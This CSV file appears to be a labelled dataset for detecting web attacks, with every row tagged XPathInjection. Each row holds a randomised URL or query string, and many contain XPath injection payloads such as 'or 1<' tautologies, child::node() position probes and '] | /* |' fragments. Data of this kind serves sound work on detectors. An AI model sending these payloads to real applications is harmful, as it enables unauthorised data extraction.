id,class,vector
0,XPathInjection,/lqlehaRus4/wREtSesTncl9tln/nI/u8ti8/L@AHchild/r0nJdq.9T/ne/g4c6cHsWen/stdinTc1copydi7Ntvg/kLk52NL3lKbqj/1huhzroseeaTuaa/oKuv_P2PxUjA.cfm?sMcu3tdDhes=reesEh&aOfJ1N=140&en3ifiGgite=37881+++or+++1%3C+++1arn%2FdtXu%2Fs%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D4%5D+++or++++32%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27&mw0i2boofe=dmeo0rdtT&h4noFrlrue0gee=241294911&ZMsT=8123606893&be4htes=soumPsp
4,XPathInjection,nlmbmpea=eSddetgeciimsibn&aiftr=39&mst=1178800491&hsf1mOEohS=kl6ounb3bs1k2e&uebtci=us0rqennDrefi
8,XPathInjection,/eiy.asp?XuRPe=Rtmsr&ph5dd=u0h1otperlSe&sex2tp=input0d02&ve6tha=R+ea%29&tkatx0sddw=nel%7EhtoN
19,XPathInjection,/rHuRDkj.FhbGaWODL2/ntueeehs/vxftZizutkgQDIOPv.gif?qi=%3D&unMmtnhtFuso=in3irrvithf&sfprIiytz1ksn=xsueiadn%27+++++or+++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D++or+++++%27Nju2lrt%27+%3D++++%27&ntt=rf5yFidest1ateet
30,XPathInjection,/bFaFh_sS.JFRVm@J/a.qb0Mf/mo4jAl4ELEhHVLKw/8eShyOecdotsAanee/tYw2bS-ER0.SlZ/ipyEc9naiQelU.shtml?aeTlak=5922+or+++e%2FqN%2Fw%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D9%5D++++or+++++72451%3D&acthv=77&lh=%26Lrxcnedf%3B+vbscriptl%7Ec%3AEd&Amnv=teoaZinodeTN&mrWj42wn8naam1=8&Mea=h9gzmxCbi
35,XPathInjection,/dsof.jpg?qt3s3Haee=769&oruun2k=83+or+++++1%3C+cTiy%2Fen54te%2Fbgtmoe%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D685%5D+or+43190%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27&ena=7415
48,XPathInjection,umailKxvIJ=ss@i5fZ7t7TI&delete2QtCkphp=qaff&cqci=35920468&i3=nnldsoc%&mtr8q=7e&trieifgbwcrihid=nlisaualiru&rhlrS9t4o59=9656975&aorevmtius=06&yrnefiTiug1ttO=metapt&xp_&Fv=s@dYFPJ&LHehlsr=in i= |&h8j6hnlaruuos=19&ewduc=726&tye1e=n9G&Nw4dwobanE=d6
52,XPathInjection,/s4iweitnHtrsr9iahs4a/hockg4imt/rtO/d-pJSOs3.tiwDaP/afE7fSLdSxqe/upMKqZ.V_XebzGQN0R/npdKiyzJ/nheine8ey8S/1Ibh/rntc/eaasEtminyGdtboy5u/dXnl1hsaire.php?ehEdrncwrechni=ore&SgRUi=dTi&7ds7rjeuV=b+%2F3a6nL&4perlr58=tuPfymHoj.g2&HUZCaselectJnodeEX=61135+++or+++count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D+++%7C++++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1+or+++80371%3D&5svrno7=aPpNhMM&tbqn=rjeytz%3C5%26OtheR%3Eame%3E
58,XPathInjection,/Belj2aNtWrac/mPqV0l@F/dNiacnniedetrne/Ctitaaihgrcenuo.jpeg?4p4t=ari%29&yiataO=fopen&iyt=%263dpassthrus6%27xbij&ti=1311&rYGVD7k=%28i++%3C+++count%28Uca%2Fchild%3A%3Atext%28%29%29+and++j++%3C+++count%283hoT%2Fchild%3A%3Acomment%28%29%29++++and++k+++++%3C++++count%28oys8T9%2Fchild%3A%3A*%29++%29&s4zg4insert0=3ig8annTooN&J9NutML7z=726&lsticom5uz=73249
63,XPathInjection,/BGd/aEerrrgeSeslt/lcA-xvqcat0qksAE/RwxqvnS/DA5CFV-4/g0s1rgtleje/iicohthnh2nott4rd/4_yW/enndhtsaYsaeenevjdi/iv6r4umeaaijbNlr/rj84igtmrnnbEmc6/trtuEohmse0inGleeir.cfm?79=ttdncwipu%40t1%5Bi%25&5oehae=weeeeD&cuyshlalesTh=gtuz&1ttv=15182105&rduelttrsl=vrsxstzwbfflsgap2d&srnIedtr9i=zentpgohEa3ai4m1t&b9iecelasr=734+++++or+++++ouht%2Frdn%2Fg7a%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D3%5D++++or++5700%3D&mT=rQG1.KK4&idis=3hthnia4ar&a5tRinebn=65626923&7dbgsoundIstyleFihomeD2ef=access_logmot&fo9td=5
66,XPathInjection,/hMBY-7CLvTLZBM/1d4Myiesbloa/irgaieoeqsgSrfTei/qsrBSKWw/a7kQxibkprtkq/DOuu/rtI2cD..js?t8oeaco4=wmte46UsEll&SQlO=smsl%27+++++or+++++6+%3C++count%28path%2Fchild%3A%3A*%29++or++%27rl%27+++%3D++++%27&iwwsalA=htelnetnsock_streamAnn+we&rViPecho7Vg=6877696690&fwn3arx=ly
70,XPathInjection,/-1U_hQDbgsound-8/yevt7Sw/aGy7eJ/@f3a0Q/aITvrnwuTmcnmtpi4gt/BQXovKRN.K/riuOzCOBV8euG.bin?iq6tesstciNa=qlsuehgnu&ehaonmtteeheba=0033822
75,XPathInjection,/zARJJ1Pyqpopen9F1/eosSf/oLKeazmfD/udoI2hiodrhoyqm/ppassthruak7qTl8having/TpRd33redo2s/RVtxs76te/h7ei/z-XUa4Tsq/ioa.cgi?erbecpiDLe=nes&2nhonisAetars=9078&t0ec=48117050&em=gyIhaB5X&v9s=a%27&dw6Uaeldweve=oR1e&ih4oSatLnhrv=teVoScgtbhza4taSy&ikdrRsats=epsP%24%5Boperlvarmsl8&tedAyoo=8t%27+or+++++%28i++++%3C+count%280r%2Fchild%3A%3Atext%28%29%29++and+++++j+++++%3C++count%28Md%2Fchild%3A%3Acomment%28%29%29+++and++k++++%3C+++++count%28gA%2Fchild%3A%3A*%29++%29+++or++%27idah%27++++%3D%27++8cttxg%27+or&pnem79ulapg=41&ieWoir=875&qRFpassthru.P-pbgsoundY9=-s-%27wp&9irwrtybh8otc=195136&from.GTCmI=4ip&ta9rehomex=-+
78,XPathInjection,/edvumcj5mcr59Urwn/g63shNJxq6-SP/iuRl0aseoiraiwtceouh/mK.gif?sr=huhaIw%27+++or++++sh7%2Fnaout%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D785%5D++or+++++%27yeiam1%27%3D+%27&lkhhilbaEboo=1&onUatonc=%3CTcfuwp-eobwEe%29tdw&eqcbsastsus=3531403&toetevetooed=01&nFvn=soi+6p&3lP.=69753
83,XPathInjection,/kcCH_sgYSxdwMEl/ChaniXonnsr/az_/eFq240c@Yi0Zsx/gz2@CF.CmLTrO/RaLxttntpee1fsede/ba/nCk/hFrS9qgG/aTcVtbodyperlTxg/emGM_AgHc.bin?rorefcsoer=%5Bot&vregfapgocelixl=sg8R6&hp4=oku%27coag&i2Ieeeg=rcpnEe%7Elog4ed&jform_Puynevt6=853737667&ei=u6ULBDXBi&uc2jce4eneua=1zenecho%7Em&hUenege=5q&LdM0dB0q4QkVw=78993351&tedslSl=y4caccess_logC%24Qdnj&sksanre1sel=Mscript3tiisii+aslo%27%5Dbc%5B%7E&nrr8aaiylttgt=644687&9mgrseNlNai=eiee&7osSvgsydsnan=8Nh%27++++or+gooU1b%2Fea3loN%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D696%5D++++or+%27t3vwyoe%27++%3D++%27&pk3shomejQ3document=tre4
90,XPathInjection,/sZN_tgKN@v/vU5466iSMRjfmu5b2h4/e6iiqomSvqp4Z/pnhpe4aqeiarsSzBec/Qk6Y3Df0xt0yYN/rytIdXlckgj9RbUi/zagIhakUa/SEt/eugxdrgWae/zsEWLPupdatew/f9xR.KVX18/aadE5a7.mspx?isth=hctarnMl&mItcrzteSi1t=EWntt2riaoLpo&shte2guwknt=tddsel%27+or+++++1%3C+++hb%2Fn%2Fmofc%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D9%5D++or++++%27dfi%27++++%3D+%27&eeaa=au45-9ech1&nasei=drwhd
101,XPathInjection,/ckatvMmes1/5hsorruattHehctno/1VRN/sqdfG6eere/hhs3tyyei/US8lsdivvmailwYxtermIySobject/Sk0eetrihEcc9am2/e0QjrkqnqXVKhQ/nrr_EVUk./og9ES5zCT/QTfIpsepu.-.jpeg?winGtchmi3l05t=%270r&n9nsa9rsE=tmpe&rcp9Ui3gJsU=Gipa&dsntkftBlaa=e+olx%3Eeahen+maep+&h0mepsRhm1f=itinbna&aZ0yX=mdggdhOAo&Osoleeelid9rd1c=sn%7E&sint1owzed=o&egpAccSeesz=29921&DhvesNedw=60441&nnnunpitdE=5122605
108,XPathInjection,z2seameet6rzGms=udSJGUf8Nj&sKx3ZUZ=75&ftdc0enec6=a6Ra5f4feson&@body3orx6UN8oVA=yuAXQd_&yoeiC1ur=f&Y93processing-instructionZb5j=7927207&2paFddrZsn=588&nhoc31aaaDx=2:eot&sneh=~OsVa&i5hrdib2oapBs7J=betrierzRtmod6o&eldtwSv5tauulyc=aaem'    or (i  < count(alua/child::text()) and   j    <     count(ee/child::comment())    and     k <    count(mdisg/child::*)   )  or     'iu'=' lsnlu2p'  or&hnawtadbe1o32=682456
